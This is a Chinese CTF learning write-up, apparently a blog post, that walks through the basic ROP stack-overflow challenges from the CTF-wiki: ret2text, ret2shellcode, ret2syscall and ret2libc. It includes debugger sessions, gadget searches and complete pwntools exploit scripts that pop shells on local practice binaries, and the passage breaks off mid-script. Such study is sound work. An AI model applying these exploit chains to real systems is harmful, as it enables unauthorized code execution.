{"pageProps":{"postData":{"id":"PWN - 基本ROP","contentHtml":"<h1>PWN - 基本ROP</h1>\n<blockquote>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p>\n</blockquote>\n<p>这里用到的所有题目：<a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/</a></p>\n<p><code>HackTheBox - Ellingson</code> 碰到缓冲区溢出，无从下手，故有此篇</p>\n<h2>ret2text</h2>\n<p><code>ret2text</code> 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) </p>\n<p>收查看程序保护机制</p>\n<pre><code class=\"hljs language-bash\">➜  ret2text checksec ret2text          \n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n</code></pre>\n<p>仅仅开启<code>NX</code> ，并且是 <code>32</code> 位程序</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image.png\" alt=\"image.png\"></p>\n<p><code>gets</code>函数，很明显存在缓冲区溢出漏洞，并且没有做边界保护</p>\n<p>并且<code>secure</code>函数中有 <code>/bin/sh</code></p>\n<pre><code class=\"hljs language-bash\">void <span class=\"hljs-function\"><span class=\"hljs-title\">secure</span></span>()\n{\n  unsigned int v0; // eax\n  int input; // [esp+18h] [ebp-10h] BYREF\n  int secretcode; // [esp+1Ch] [ebp-Ch]\n\n  v0 = <span class=\"hljs-keyword\">time</span>(0);\n  srand(v0);\n  secretcode = rand();\n  __isoc99_scanf(&#x26;unk_8048760, &#x26;input);\n  <span class=\"hljs-keyword\">if</span> ( input == secretcode )\n    system(<span class=\"hljs-string\">\"/bin/sh\"</span>);\n}\n</code></pre>\n<p>定位<code>system</code>函数</p>\n<pre><code class=\"hljs language-bash\">pwndbg> disas secure\nDump of assembler code <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">function</span> secure:\n   0x080485fd &#x3C;+0>:     push   ebp\n   0x080485fe &#x3C;+1>:     mov    ebp,esp\n   0x08048600 &#x3C;+3>:     sub    esp,0x28\n   0x08048603 &#x3C;+6>:     mov    DWORD PTR [esp],0x0\n   0x0804860a &#x3C;+13>:    call   0x8048470 &#x3C;<span class=\"hljs-keyword\">time</span>@plt>\n   0x0804860f &#x3C;+18>:    mov    DWORD PTR [esp],eax\n   0x08048612 &#x3C;+21>:    call   0x80484b0 &#x3C;srand@plt>\n   0x08048617 &#x3C;+26>:    call   0x80484e0 &#x3C;rand@plt>\n   0x0804861c &#x3C;+31>:    mov    DWORD PTR [ebp-0xc],eax\n   0x0804861f &#x3C;+34>:    lea    eax,[ebp-0x10]\n   0x08048622 &#x3C;+37>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048626 &#x3C;+41>:    mov    DWORD PTR [esp],0x8048760\n   0x0804862d &#x3C;+48>:    call   0x80484f0 &#x3C;__isoc99_scanf@plt>\n   0x08048632 &#x3C;+53>:    mov    eax,DWORD PTR [ebp-0x10]\n   0x08048635 &#x3C;+56>:    cmp    eax,DWORD PTR [ebp-0xc]\n   0x08048638 &#x3C;+59>:    jne    0x8048646 &#x3C;secure+73>\n   0x0804863a &#x3C;+61>:    mov    DWORD PTR [esp],0x8048763\n   0x08048641 &#x3C;+68>:    call   0x8048490 &#x3C;system@plt>\n   0x08048646 &#x3C;+73>:    leave\n   0x08048647 &#x3C;+74>:    ret\nEnd of assembler dump.\n</code></pre>\n<p>在<code>0x0804863a</code>处</p>\n<p>接下来计算偏移量，使用 <code>pwndbg</code></p>\n<p>反编译<code>main</code>找到<code>gets</code> <code>0x080486ae</code></p>\n<pre><code class=\"hljs language-bash\">pwndbg> disas main\nDump of assembler code <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">function</span> main:\n   0x08048648 &#x3C;+0>:     push   ebp\n   0x08048649 &#x3C;+1>:     mov    ebp,esp\n   0x0804864b &#x3C;+3>:     and    esp,0xfffffff0\n   0x0804864e &#x3C;+6>:     add    esp,0xffffff80\n   0x08048651 &#x3C;+9>:     mov    eax,ds:0x804a060\n   0x08048656 &#x3C;+14>:    mov    DWORD PTR [esp+0xc],0x0\n   0x0804865e &#x3C;+22>:    mov    DWORD PTR [esp+0x8],0x2\n   0x08048666 &#x3C;+30>:    mov    DWORD PTR [esp+0x4],0x0\n   0x0804866e &#x3C;+38>:    mov    DWORD PTR [esp],eax\n   0x08048671 &#x3C;+41>:    call   0x80484d0 &#x3C;setvbuf@plt>\n   0x08048676 &#x3C;+46>:    mov    eax,ds:0x804a040\n   0x0804867b &#x3C;+51>:    mov    DWORD PTR [esp+0xc],0x0\n   0x08048683 &#x3C;+59>:    mov    DWORD PTR [esp+0x8],0x1\n   0x0804868b &#x3C;+67>:    mov    DWORD PTR [esp+0x4],0x0\n   0x08048693 &#x3C;+75>:    mov    DWORD PTR [esp],eax\n   0x08048696 &#x3C;+78>:    call   0x80484d0 &#x3C;setvbuf@plt>\n   0x0804869b &#x3C;+83>:    mov    DWORD PTR [esp],0x804876c\n   0x080486a2 &#x3C;+90>:    call   0x8048480 &#x3C;puts@plt>\n   0x080486a7 &#x3C;+95>:    lea    eax,[esp+0x1c]\n   0x080486ab &#x3C;+99>:    mov    DWORD PTR [esp],eax\n   0x080486ae &#x3C;+102>:   call   0x8048460 &#x3C;gets@plt>\n   0x080486b3 &#x3C;+107>:   mov    DWORD PTR [esp],0x80487a4\n   0x080486ba &#x3C;+114>:   call   0x8048450 &#x3C;<span class=\"hljs-built_in\">printf</span>@plt>\n   0x080486bf &#x3C;+119>:   mov    eax,0x0\n   0x080486c4 &#x3C;+124>:   leave\n   0x080486c5 &#x3C;+125>:   ret\nEnd of assembler dump.\n</code></pre>\n<p>在<code>gets</code>处设置断点</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b *0x080486ae\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\n</code></pre>\n<p><code>run</code>然后观察栈帧</p>\n<pre><code class=\"hljs language-bash\">pwndbg> run                 \nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text \nwarning: Unable to find libthread_db matching inferior<span class=\"hljs-string\">''</span>s thread library, thread debugging will not be available.\nThere is something amazing here, <span class=\"hljs-keyword\">do</span> you know anything?\n                                                         \nBreakpoint 1, 0x080486ae <span class=\"hljs-keyword\">in</span> main () at ret2text.c:24\nwarning: 24     ret2text.c: No such file or directory\nWarning: Avoided exploring possible address 0xfffdade8.                                                                                                                                                                             \nYou can explicitly explore it with `vmmap-explore 0xfffda000`\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────\n EAX  0xffffcfac ◂— 0   \n EBX  0xf7f9ae14 ◂— 0x232d0c /* <span class=\"hljs-string\">'\\x0c-#'</span> */                                                                                                                                                                                         \n ECX  0xf7f9c8e0 ◂— 0\n EDX  0\n EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0\n ESI  0x80486d0 (__libc_csu_init) ◂— push ebp\n EBP  0xffffd018 ◂— 0\n ESP  0xffffcf90 —▸ 0xffffcfac ◂— 0\n EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8\n</code></pre>\n<p>可以看到<code>EBP</code> =<code>0xffffd018</code> ，<code>ESP</code> =<code>0xffffcfa</code></p>\n<pre><code class=\"hljs language-bash\">pwndbg> p/d 0xffffd018 - 0xffffcfac\n<span class=\"hljs-variable\">$1</span> = 108\n</code></pre>\n<p>编写<code>exp</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2text <span class=\"hljs-built_in\">cat</span> exp.py\nfrom pwn import *\n\nsh = process(<span class=\"hljs-string\">'./ret2text'</span>)\ntarget = 0x0804863a\npayload = b<span class=\"hljs-string\">'A'</span> * 112 + p32(target)\nsh.sendline(payload)\nsh.interactive()\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2text python exp.py\n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2text'</span>: pid 3343\n[*] Switching to interactive mode\nThere is something amazing here, <span class=\"hljs-keyword\">do</span> you know anything?\nMaybe I will tell you next <span class=\"hljs-keyword\">time</span> !$ <span class=\"hljs-built_in\">whoami</span>\nroot\n$  \n</code></pre>\n<h2><strong>ret2shellcode</strong></h2>\n<p><code>ret2shellcode</code>，即控制程序执行 <code>shellcode</code> 代码。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。\n查看保护机制，未开启任何保护</p>\n<pre><code class=\"hljs language-bash\">➜  ret2shellcode checksec ret2shellcode \n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2shellcode/ret2shellcode'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x8048000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n    Debuginfo:  Yes\n</code></pre>\n<p>依旧是<code>gets</code> ，存在缓冲区溢出漏洞</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image1.png\" alt=\"image.png\"></p>\n<p>但是这次并没有其他函数，也没有 <code>/bin/sh</code> 的身影</p>\n<p>这里使用<code>strncpy</code>将<code>s</code>传递到<code>buf2</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image2.png\" alt=\"image.png\"></p>\n<p>我们调试一下程序，查看<code>bss</code>区域是否拥有读写权限</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image3.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\"> 0x804a000  0x804b000 rw-p     1000   1000 ret2shellcode\n</code></pre>\n<p>那么思路就是：<code>shellcode +（偏移值 - len(shellcode)）* A  + buf2add</code></p>\n<p>计算偏移量</p>\n<p>首先生成<code>200</code>长度但是每一段都是唯一的字符</p>\n<pre><code class=\"hljs language-bash\">pwndbg> cyclic 200\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n</code></pre>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image4.png\" alt=\"image.png\"></p>\n<p>返回地址被<code>daab</code> 覆盖上去了，再计算偏移量</p>\n<pre><code class=\"hljs language-bash\">pwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b<span class=\"hljs-string\">'daab'</span> (hex: 0x64616162)\nFound at offset 112\n</code></pre>\n<p>偏移量和<code>buf2</code>地址我们都知道了，直接编写<code>payload</code></p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nshellcode = asm(shellcraft.sh())\nshellcode_pad = shellcode + (112 - (len(shellcode))) * b<span class=\"hljs-string\">'A'</span>\nbuf2_add = 0x804a080\nsh = process(<span class=\"hljs-string\">'./ret2shellcode'</span>)\nsh.sendline(shellcode_pad + p32(buf2_add))\nsh.interactive()\n</code></pre>\n<pre><code class=\"hljs language-bash\">root@sunset-virtual-machine:~# python3 exp.py \n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2shellcode'</span>: pid 58718\n[*] Switching to interactive mode\nNo system <span class=\"hljs-keyword\">for</span> you this <span class=\"hljs-keyword\">time</span> !!!\n<span class=\"hljs-built_in\">bye</span> <span class=\"hljs-built_in\">bye</span> ~$ <span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\n</code></pre>\n<h2><strong>ret2syscall</strong></h2>\n<p><code>ret2syscall</code>，即控制程序执行系统调用，获取 <code>shell</code>。</p>\n<p>查看程序，<code>32</code>位，静态程序，没有使用动态链接库</p>\n<pre><code class=\"hljs language-bash\">➜  ret2syscall file ret2syscall \nret2syscall: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, <span class=\"hljs-keyword\">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\n</code></pre>\n<p>查看保护机制，栈不可执行，无法使用<code>ret2shellcode</code></p>\n<pre><code class=\"hljs language-bash\">➜  ret2syscall checksec ret2syscall            \n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n</code></pre>\n<p>这里还涉及到系统调用，一般我们通过一下系统调用来获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">execve(<span class=\"hljs-string\">\"/bin/sh\"</span>,NULL,NULL)\n</code></pre>\n<p>当遇到<code>32</code>位程序时，需要使得：</p>\n<ul>\n<li>系统调用号，即 eax 应该为 <code>0xb</code>（<code>0xb</code> 为 <code>execve</code> 对应的系统调用号）也就是<code>11</code></li>\n<li>第一个参数，即 ebx 应该指向 <code>/bin/sh</code> 的地址，其实执行 sh 的地址也可以。</li>\n<li>第二个参数，即 ecx 应该为 <code>0</code></li>\n<li>第三个参数，即 edx 应该为 <code>0</code></li>\n</ul>\n<p>最后将系统调用和参数都填入寄存器后，我们再让系统触发 <code>0x80</code> 号中断（<code>int 0x80</code>）</p>\n<p><code>Linux</code>对系统调用的调用必须通过执行<code>int $0x80</code>汇编指令，这条指令会产生向量为<code>128</code>的编程异常</p>\n<p>IDA 反编译程序，依旧是<code>gets</code> ，存在缓冲区溢出漏洞</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image5.png\" alt=\"image.png\"></p>\n<p><code>shift</code> + <code>F12</code> 查看程序字符串，能看到 <code>/bin/sh</code> 我们刚好可以利用</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image6.png\" alt=\"image.png\"></p>\n<p>但是因为开启了 <code>NX</code> 我们无法往栈上写，写了也无法执行，也不存在<code>system(\"/bin/sh\")</code> 代码段，程序是静态的，所以 <code>ret2shellcode</code> <code>ret2text</code> <code>ret2libc</code> 都无法使用，但是存在<code>/bin/sh</code> 代码片段，所以我们可以尝试 <code>ret2syscall</code></p>\n<p>通过<code>ROPgadget</code> 查找需要用到寄存器指令</p>\n<p><code>pop eax ; ret</code> 地址为 <code>0x080bb196</code></p>\n<pre><code class=\"hljs language-bash\">➜  ret2syscall ROPgadget --binary ret2syscall --only <span class=\"hljs-string\">\"pop|ret\"</span> | grep eax\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n**0x080bb196 : pop eax ; ret**\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n</code></pre>\n<p>发现一串连续的将<code>ebx~edx</code>弹出的<code>pop edx ; pop ecx ; pop ebx ; ret</code> ，地址为<code>0x0806eb90</code></p>\n<pre><code class=\"hljs language-bash\">➜  ret2syscall ROPgadget --binary ret2syscall --only <span class=\"hljs-string\">\"pop|ret\"</span> | grep ebx\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n**0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret**\n</code></pre>\n<p>命令字段 <code>0x080be408</code> 地址</p>\n<pre><code class=\"hljs language-bash\">➜  ret2syscall ROPgadget --binary ret2syscall --string <span class=\"hljs-string\">\"/bin/sh\"</span>         \nStrings information\n============================================================\n0x080be408 : /bin/sh\n</code></pre>\n<p>中断代码地址 <code>0x08049421</code></p>\n<pre><code class=\"hljs language-bash\">➜  ret2syscall ROPgadget --binary ret2syscall --only <span class=\"hljs-string\">\"int\"</span>   \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080890b5 : int 0xcf\n</code></pre>\n<p>计算偏移量，为<code>112</code></p>\n<pre><code class=\"hljs language-bash\">pwndbg> cyclic 200\naaaabaaacaaa...waabxaabyaab\n\npwndbg> run\nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall \nThis <span class=\"hljs-keyword\">time</span>, no system() and NO SHELLCODE!!!\nWhat <span class=\"hljs-keyword\">do</span> you plan to <span class=\"hljs-keyword\">do</span>?\naaaabaaacaaadaaaeaaafaaagaaaabuaabvaabwaabxaabyaab\n\nProgram received signal SIGSEGV, Segmentation fault.                  \n0x62616164 <span class=\"hljs-keyword\">in</span> ?? ()                                                                                               \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                  \n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─\n ECX  0xfbad2288                                                                                                  \n EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0                                                                         \n EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]\n ESI  0             \n ESP  0xffffd100 ◂— <span class=\"hljs-string\">'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'</span>\n EIP  0x62616164 (<span class=\"hljs-string\">'daab'</span>)\n─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / <span class=\"hljs-built_in\">set</span> <span class=\"hljs-built_in\">emulate</span> on ]──────────\nInvalid address 0x62616164\n\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b<span class=\"hljs-string\">'daab'</span> (hex: 0x64616162)\nFound at offset 112\n</code></pre>\n<p>使用代码块绘制的利用链</p>\n<pre><code class=\"hljs language-bash\">           |-----------------------------| 高地址\n           | ...                         |\n           |-----------------------------|\n           | int_0x80_addr               |  &#x3C;-- ret from pop_..._ret\n           |-----------------------------|\n           | bin_sh_addr                 |  &#x3C;-- pop into ebx\n           |-----------------------------|\n           | 0x0                         |  &#x3C;-- pop into ecx\n           |-----------------------------|\n           | 0x0                         |  &#x3C;-- pop into edx\n           |-----------------------------|\n           | pop_edx_ecx_ebx_ret_addr    |  &#x3C;-- ret from pop_eax_ret\n           |-----------------------------|\n           | 0xb                         |  &#x3C;-- pop into eax\n           |-----------------------------|\n           | pop_eax_ret_addr            |  &#x3C;-- Overwritten <span class=\"hljs-built_in\">return</span> address\n   ebp     |-----------------------------|\n           | ...                         |\n           |-----------------------------|\n   buf ->  | gets buffer start           |\n   esp     |-----------------------------| 低地址\n</code></pre>\n<p>编写<code>EXP</code></p>\n<pre><code class=\"hljs language-bash\">from pwn import *\n\npop_eax_ret_addr = 0x080bb196\npop_edx_ecx_ebx_addr = 0x0806eb90\nbin_sh_addr = 0x080be408\nint_0x80_addr = 0x08049421\n\nsh = process(<span class=\"hljs-string\">'./ret2syscall'</span>)\nsh.sendline(b<span class=\"hljs-string\">'A'</span>*112 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr))\nsh.interactive()\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2syscall python exp.py\n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2syscall'</span>: pid 2825\n[*] Switching to interactive mode\nThis <span class=\"hljs-keyword\">time</span>, no system() and NO SHELLCODE!!!\nWhat <span class=\"hljs-keyword\">do</span> you plan to <span class=\"hljs-keyword\">do</span>?\n$ <span class=\"hljs-built_in\">whoami</span>\nroot\n</code></pre>\n<h2>ret2libc</h2>\n<p><code>ret2libc</code> 即控制函数的执行 <code>libc</code> 中的函数，通常是返回至某个函数的 <code>plt</code> 处或者函数的具体位置 (即函数对应的 <code>got</code> 表项的内容)。</p>\n<p>其中 <code>libc</code> 指的是<code>C</code> 标准库（<code>standard C library</code>）的实现，通常是 <code>/lib/x86_64-linux-gnu/libc.so.6</code> 或 <code>/lib/i386-linux-gnu/libc.so.6</code></p>\n<p><code>libc</code>库是<code>Linux</code>下的<code>C</code>函数库，而<code>libc</code>库中存放的就是这些函数的偏移地址，所以只要确定了<code>libc</code>库的版本，就能知道函数的偏移地址，但是我们这里在本地运行的样本，所以可以直接忽视。</p>\n<h3>ret2libc1</h3>\n<p>使用 IDA 反编译，<code>gets</code>存在缓冲区溢出漏洞</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image7.png\" alt=\"image.png\"></p>\n<p><code>secure</code> 中的 <code>system</code>被修改了，所以无法使用<code>ret2text</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image8.png\" alt=\"image.png\"></p>\n<p><code>32</code> 位程序，并且调用动态链接库</p>\n<pre><code class=\"hljs language-bash\">➜  ret2libc file ret2libc1         \nret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class=\"hljs-keyword\">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped\n</code></pre>\n<p><code>NX</code> 启动，所以<code>ret2shellcode</code> 也无法使用</p>\n<pre><code class=\"hljs language-bash\">➜  ret2libc checksec ret2libc1 \n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n</code></pre>\n<p>因为这里用了动态链接库，所以优先使用 <code>ret2libc</code></p>\n<p>字符串中能看到 <code>/bin/sh</code> <code>08048720</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image9.png\" alt=\"image.png\"></p>\n<p>尝试寻找 <code>system</code>函数，也找到了<code>08048460</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image10.png\" alt=\"image.png\"></p>\n<p>计算偏移值（和上边一样的操作）</p>\n<pre><code class=\"hljs language-bash\">pwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b<span class=\"hljs-string\">'daab'</span> (hex: 0x64616162)\nFound at offset 112\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc <span class=\"hljs-built_in\">cat</span> exp.py \nfrom pwn import *\n\nsystem_plt_addr = 0x08048460\nbin_sh_addr = 0x8048720\nsh = process(<span class=\"hljs-string\">'./ret2libc1'</span>)\nsh.sendline(112 * b<span class=\"hljs-string\">'A'</span> + p32(system_plt_addr) + 4 * b<span class=\"hljs-string\">'A'</span> + p32(bin_sh_addr))\nsh.interactive()\n</code></pre>\n<p>可以看到为什么要加上 <code>4 * b'A'</code> ，因为这是给<code>system</code>的假的返回地址</p>\n<pre><code class=\"hljs language-bash\">           | ... higher addresses ...   |\n           +----------------------------+\n           | p32(bin_sh_addr)           | &#x3C;-- (被我们写入) system 的参数\n           +----------------------------+\n           | 4 * b<span class=\"hljs-string\">'A'</span> (0x41414141)      | &#x3C;-- (被我们写入) system 的假返回地址\n           +----------------------------+\n           | p32(system_plt_addr)       | &#x3C;-- (被我们写入) 覆盖了 main 的返回地址\n           +----------------------------+\n           | 4 字节的 <span class=\"hljs-string\">'A'</span>               | &#x3C;-- (被我们写入) 覆盖了 old EBP\n           +----------------------------+\n           | 108 字节的 <span class=\"hljs-string\">'A'</span>             | \\\n           | ...                        |  |\n           | <span class=\"hljs-string\">'A'</span>                        |  } 填充了整个 buffer 和额外的空间\n           | <span class=\"hljs-string\">'A'</span>                        | /\n           +----------------------------+ &#x3C;-- buffer 的起始地址\n           | ... lower addresses ...    |\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc python exp.py\n[+] Starting <span class=\"hljs-built_in\">local</span> process <span class=\"hljs-string\">'./ret2libc1'</span>: pid 3166\n[*] Switching to interactive mode\nRET2LIBC >_&#x3C;\n$ <span class=\"hljs-built_in\">whoami</span>\nroot\n</code></pre>\n<h3>ret2libc2</h3>\n<p>依旧是 <code>gets</code> ，存在缓冲区溢出漏洞</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image11.png\" alt=\"image.png\"></p>\n<p><code>checksec</code>以及文件类型，和<code>ret2libc1</code>基本没差</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc checksec ret2libc1\n[*] <span class=\"hljs-string\">'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'</span>\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n(pwn) ➜  ret2libc file ret2libc2         \nret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class=\"hljs-keyword\">for</span> GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n</code></pre>\n<p>字符串中找不到 <code>/bin/sh</code>了</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image12.png\" alt=\"image.png\"></p>\n<p><code>system</code> 函数还在 <code>0x08048490</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image13.png\" alt=\"image.png\"></p>\n<p>所以需要我们构造 <code>/bin/sh</code> <code>0x08048480</code></p>\n<p>可以看到还存在<code>gets</code> <code>0x08048460</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image14.png\" alt=\"image.png\"></p>\n<p>我们可以多调用一次<code>gadget</code> ，所以我们要找到一片可读写的缓冲区</p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image15.png\" alt=\"image.png\"></p>\n<p><code>buf2</code>区域刚好可以 <code>0x0804A080</code></p>\n<p><img src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image16.png\" alt=\"image.png\"></p>\n<p>此时我们还要保持堆栈平衡，也就是<code>gets</code>执行完时，<code>gets</code>的返回地址会处于栈顶，但是接下来我们调用<code>system</code>函数，所以我们需要在返回地址<code>+4</code>(就是要把<code>buf</code>清理掉，让<code>ROP</code>链指向下一条也就是<code>system</code>)，所以这里可以寻找 <code>pop xxx ;ret</code> 或者 <code>add esp 4; ret</code></p>\n<pre><code class=\"hljs language-bash\">ESP --> | p32(pop_ebx_addr) |  &#x3C;-- gets函数的“返回地址”\n        +-------------------+\n        |  p32(buf2_addr)   |  &#x3C;-- gets函数的参数（gets写入后，我们需要将其弹出）\n        +-------------------+\n        | p32(libc_system_addr) |\n        +-------------------+\n        |      b<span class=\"hljs-string\">'B'</span>*4       |\n        +-------------------+\n        |  p32(buf2_addr)   |\n        +-------------------+\n</code></pre>\n<p>使用<code>ROPgadget</code>来寻找<code>0x0804843d</code> 就符合</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ret2libc ROPgadget --binary ret2libc2 --only <span class=\"hljs-string\">\"pop|ret\"</span>\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n</code></pre>\n<p>计算偏移值，也和上边一样是<code>112</code></p>\n<pre><code class=\"hljs language-bash\">from pwn import *\n\ngets_plt_addr = 0x08048460\npop_ebx_ret_addr = 0x0804843d\nsystem_plt_addr = 0x08048490\nbuf2 = 